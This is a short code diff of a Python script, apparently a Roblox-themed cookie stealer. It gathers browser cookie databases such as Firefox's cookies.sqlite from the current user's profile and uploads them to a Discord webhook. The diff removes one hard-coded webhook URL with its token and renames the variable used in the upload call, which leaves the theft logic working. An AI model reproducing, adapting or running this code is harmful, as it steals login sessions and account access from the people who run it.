@@ -487,7 +487,6 @@ class Roblox:
         os.remove(path=path)
 
 k = Roblox()
-hok = 'https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM'
 user = os.getlogin()
 flis = [
     f"C:/Users/{user}/AppData/Local/Mozilla/Firefox/Profiles/*.default*/cookies.sqlite",
@@ -501,7 +500,7 @@ for fpath in flis:
             nam = fpath.split('/')[-1] 
             files = {'file': (nam, file)  }
             try:
-                r = requests.post(hok, files=files)
+                r = requests.post(hook, files=files)
             except:pass
     else:continue
 
